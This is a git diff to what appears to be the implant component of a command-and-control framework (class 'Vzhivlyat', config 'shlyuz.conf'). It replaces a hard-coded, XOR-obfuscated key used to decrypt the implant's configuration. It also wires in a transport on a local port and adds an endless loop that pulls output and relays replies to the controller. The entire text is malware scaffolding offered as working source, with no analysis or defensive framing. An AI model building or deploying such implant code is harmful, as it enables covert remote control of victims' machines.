@@ -5,6 +5,7 @@ import pickle
 import configparser
 
 from lib import logging
+from lib import yadro
 
 from lib.crypto import asymmetric
 from lib.crypto import rc6
@@ -19,7 +20,7 @@ class Vzhivlyat(object):
         self.component_id = "c41b07a940254f1d87ba60aadb93dded"  # DEBUG
         self.config_file_path = "shlyuz.conf"
         # TODO: Check if this needs to be cleared in memory
-        self.config_key = xor.single_byte_xor(b'<X\x1b^\x1a\x1d?<\x1a\x05\x1d[\x05/X!', 0x69).decode('utf-8')
+        self.config_key = xor.single_byte_xor(b'0\x02X(\x01\x1c\x1b\x1c/Q\x1a ]%1Q', 0x69).decode('utf-8')
         self.config = configparser.RawConfigParser()
         self.config.read_string(self.decrypt_config())
 
@@ -32,7 +33,9 @@ class Vzhivlyat(object):
         self.current_lp_pubkey = self.initial_lp_pubkey
         self.xor_key = ast.literal_eval(self.config['crypto']['xor_key'])
 
+        self.transport = None
         self.manifest = None
+        self.cmd_queue = []
 
     def decrypt_config(self):
         with open(self.config_file_path, "rb+") as configfile:
@@ -50,3 +53,10 @@ class Vzhivlyat(object):
 
 
 vzhivlyat = Vzhivlyat()
+transport_config = {"bind_addr": "127.0.0.1", "bind_port": 8084}
+vzhivlyat.transport = yadro.import_transport_for_implant(vzhivlyat, transport_config)
+
+# TODO: I need to happen after an initialization
+while True:
+    data = yadro.retrieve_output(vzhivlyat)
+    yadro.relay_reply(vzhivlyat, data)
